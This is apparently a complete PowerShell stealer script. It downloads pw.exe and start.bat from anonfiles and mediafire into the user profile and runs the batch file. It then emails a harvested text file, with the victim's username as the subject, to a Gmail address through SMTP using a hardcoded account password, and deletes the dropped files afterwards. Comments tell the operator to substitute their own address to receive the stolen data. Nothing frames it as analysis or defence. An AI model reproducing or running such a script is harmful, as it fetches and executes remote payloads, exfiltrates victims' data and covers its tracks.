$PwExe = "pw.exe"
$WebFile = "https://cdn-122.anonfiles.com/L5Kcke8ep9/7afa462f-1610442086/pw.exe"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$PwExe")

$StartBat = "start.bat"
$WebFile = "https://download1590.mediafire.com/6ueumwtzk6og/tynokb2z306iwx6/start.bat"
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:USERPROFILE\$StartBat")

Start-Process ("$env:USERPROFILE\$StartBat")

$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
#You don't have to change the bottom Gmail. It'll only be used to send you the data.
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('artemis.by.seeber@gmail.com', 'jJ8Dt-GF_&a#t!?g')
#Replace the bottom Gmails with your Gmail address.
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'nejcpirecnik03@gmail.com'
$E.To.Add('nejcpirecnik03@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success!'
Start-Sleep -s 2
$F = "windows_sys2445.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
Start-Sleep -s 2
del pw.exe
del start.bat
exit